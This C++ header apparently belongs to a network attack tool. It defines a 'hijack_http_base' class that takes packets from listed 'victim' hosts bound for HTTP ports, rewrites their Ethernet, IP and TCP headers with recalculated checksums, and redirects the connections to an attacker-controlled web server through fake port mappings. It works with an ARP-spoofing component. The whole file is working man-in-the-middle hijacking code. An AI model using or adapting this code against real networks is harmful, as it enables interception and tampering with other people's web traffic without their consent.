//
// Created by kenny on 2/11/19.
//

#pragma once

#include "hdrs.h"
#include "pkt.h"
#include "fake-port.h"
#include "arpspf.h"

inline bool operator<(const kni::ipv4_t &a, const kni::ipv4_t &b) {
    return *(uint32_t *) (&a) < *(uint32_t *) (&b);
}

namespace kni {

    struct endpoint_t {
        ipv4_t ip;
        port_t port;
    };

    bool operator<(const endpoint_t &a, const endpoint_t &b) {
        return (a.port < b.port) ||
               (a.port == b.port && *(uint32_t *) (&a.ip) < *(uint32_t *) (&b.ip));
    }

    bool operator==(const endpoint_t &a, const endpoint_t &b) {
        return a.ip == b.ip && a.port == b.port;
    }

    struct conn_pair_t {
        endpoint_t src, dst;
    };

    class hijack_http_base : public io_packet_base, public tcp_packet {
    public:

        hijack_http_base(const lan_info *l, const endpoint_t &remote) :
                io_packet_base(),
                tcp_packet(),
                lan(l), httpd(remote),
                send_buf(new u_char[snap_len]), port_manager(10032, 0x10000, 6 * 60) {
        }

        inline void add_victim(ipv4_t ip) noexcept {
            victims.insert(ip);
        }

    private:

        inline void send_fake_packet(const endpoint_t &from, const endpoint_t &to) {
            memcpy(send_buf.get(), cap_packet, cap_info.caplen);

            // Modify Ethernet header
            fields_setter set(send_buf.get());
            set(ethHdr.src, lan->map(to_string(from.ip)));
            set(ethHdr.dst, lan->map(to_string(to.ip))).incr(ETHER_HDRLEN);

            // Modify IPv4 header
            set(ipHdr.src, from.ip);
            set(ipHdr.dst, to.ip);
            set(ipHdr.check, 0);    // Zero the checksum
            set(ipHdr.check, ipHdr.cal_checksum(set.from()));

            fields_getter get(set.from());
            // Calculate TCP checksum
            u_char buf[PSEUDO_IPV4_HDRLEN];
            set.change(buf);

            set(pseudo.proto, IPPROTO_TCP);
            set(pseudo.tcp_len, get(ipHdr.tot_len) - get(ipHdr.ihl) * 4);
            set(pseudo.rsv, 0);
            set(pseudo.src, from.ip);
            set(pseudo.dst, to.ip);

            // Modify TCP header
            set.change(send_buf.get() + ETHER_HDRLEN + get(ipHdr.ihl) * 4);
            set(tcpHdr.src, from.port);
            set(tcpHdr.dst, to.port);
            set(tcpHdr.check, 0);   // Zero the checksum
            set(tcpHdr.check, tcpHdr.cal_checksum(set.from(), buf));
#ifndef KNI_DEBUG_TEST
            if (!send_packet(send_buf.get(), cap_info.caplen))
                KNI_LOG_ERROR("%s", err());
#endif
        }

        inline void tcp_mapping_release(port_t port) {
            port_manager.free(port);    // Possibly duplicate free()

            auto iter = conn_pairs.find(port);
            fake_ports.erase(iter->second.src);
            conn_pairs.erase(iter);

            KNI_LOG_DEBUG("TCP FIN %s:%d -> %s:%d", to_string(sender.ip).c_str(), sender.port,
                          to_string(receiver.ip).c_str(), receiver.port);
        }

        inline void tcp_mapping_refresh(port_t port) {
            port_manager.refresh(port);
        }

        inline void forward_tcp_victim(fields_getter get) {
            auto iter = fake_ports.find(sender);
            port_t port;

            if (iter == fake_ports.end()) {
                // If victim's endpoint expects to send a segment after our own timeout
                // TODO Send TCP RST and return
                if (!(get(tcpHdr.flags) & tcp_header::syn)) {
                    KNI_LOG_WARN("Port times out for packet from %s:%d", to_string(sender.ip).c_str(), sender.port);
                    return;
                }
                // TCP SYN
                // Allocate a port number
                port = allocate_fake_port();
            } else {
                port = iter->second;
                if (get(tcpHdr.flags) & tcp_header::fin)
                    tcp_mapping_release(port);
                else
                    tcp_mapping_refresh(port);
            }

            send_fake_packet({lan->dev.ip, port}, httpd);
        }

        inline void forward_tcp_httpd(fields_getter get) {
            auto iter = conn_pairs.find(get(tcpHdr.dst));  // Retrieve the port mapping info
            if (iter == conn_pairs.end()) {
                // The original port times out. Drop the packet
                // TODO Send TCP RST and return
                KNI_LOG_WARN("Port times out from \"httpd\" to [%d]. ", get(tcpHdr.dst));
                return;
            }

            if (get(tcpHdr.flags) & tcp_header::fin) { // Connection termination
                tcp_mapping_release(iter->first);
            } else
                tcp_mapping_refresh(iter->first);

            send_fake_packet(iter->second.dst, iter->second.src);
        }

        inline port_t allocate_fake_port() {
            auto port = port_manager.alloc();        // Allocate a fake port number
            auto iter = conn_pairs.find(port);

            if (iter == conn_pairs.end()) {     // This port number can be used
                fake_ports[sender] = port;
                conn_pairs[port] = {sender, receiver};

                KNI_LOG_DEBUG("Port [%d] assigned to %s:%d", port, to_string(sender.ip).c_str(), sender.port);
            } else {
                // The port was used before and times out.
                // Erase the outdated record
                // This ensures that the outdated port will not be used in an incomplete TCP connection
                fake_ports.erase(iter->second.src);
                conn_pairs.erase(iter);

                KNI_LOG_DEBUG("Port [%d] reused for %s:%d", iter->first, to_string(sender.ip).c_str(), sender.port);
            }

            return port;
        }


    public:
        void handle_packet() override {
            fields_getter get(cap_packet);
            if (get(ethHdr.type) != ETH_P_IP || get.incr(ETHER_HDRLEN)(ipHdr.proto) != IPPROTO_TCP)
                return;

            auto dst_ip = get(ipHdr.dst);

            // Sender of the TCP segment
            sender = {get(ipHdr.src), get.incr(get(ipHdr.ihl) * 4)(tcpHdr.src)};
            // Receiver of the TCP segment
            receiver = {dst_ip, get(tcpHdr.dst)};

            if (victims.count(sender.ip) == 1 && receiver.port == httpd.port)
                forward_tcp_victim(get);
            else if (sender == httpd)
                forward_tcp_httpd(get);
        }

#ifdef KNI_DEBUG_TEST
    public:
#else
        protected:
#endif
        endpoint_t httpd, sender{}, receiver{};

        const lan_info *lan;

        std::set<ipv4_t> victims{};
        std::map<endpoint_t, port_t> fake_ports{};
        std::map<port_t, conn_pair_t> conn_pairs{};

        fake_port_manager port_manager;

        std::unique_ptr<u_char[]> send_buf;
    };

}